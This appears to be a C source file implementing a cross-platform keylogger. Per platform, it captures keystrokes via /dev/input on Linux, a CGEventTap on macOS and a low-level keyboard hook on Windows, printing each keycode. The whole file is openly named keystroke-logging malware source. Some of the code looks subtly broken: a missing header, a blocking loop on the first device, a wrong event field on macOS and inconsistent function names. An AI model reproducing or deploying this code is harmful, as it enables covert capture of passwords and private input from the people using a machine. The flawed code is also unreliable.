#ifdef __linux__

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdio.h>
#include <dirent.h>

void keylogger() {
    struct dirent *entry;
    DIR *dir = opendir("/dev/input");
    if (!dir) {
        perror("Failed to open /dev/input");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "event") != NULL) {
            char device_path[128];
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                perror("Failed to open input device");
                continue;
            }

            struct input_event ev;
            while (1) {
                ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
                if (bytes == -1) {
                    perror("Failed to read input event");
                    break;
                }
                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                    printf("Key pressed: %d from %s\n", ev.code, device_path);
                }
            }
            close(fd);
        }
    }

    closedir(dir);
}

#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>

CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
    if (type == kCGEventKeyDown) {
        int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
        printf("Key pressed: %d\n", keyCode);
    }
    return event;
}

void start_keylogger() {
    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, NULL);
    if (!eventTap) {
        printf("Failed to create event tap\n");
        return;
    }

    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
}
#endif

#ifdef __WIN32__


#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            printf("Key pressed: %d\n", kbd->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void start_keylogger() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to install hook\n");
        return;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
}

#endif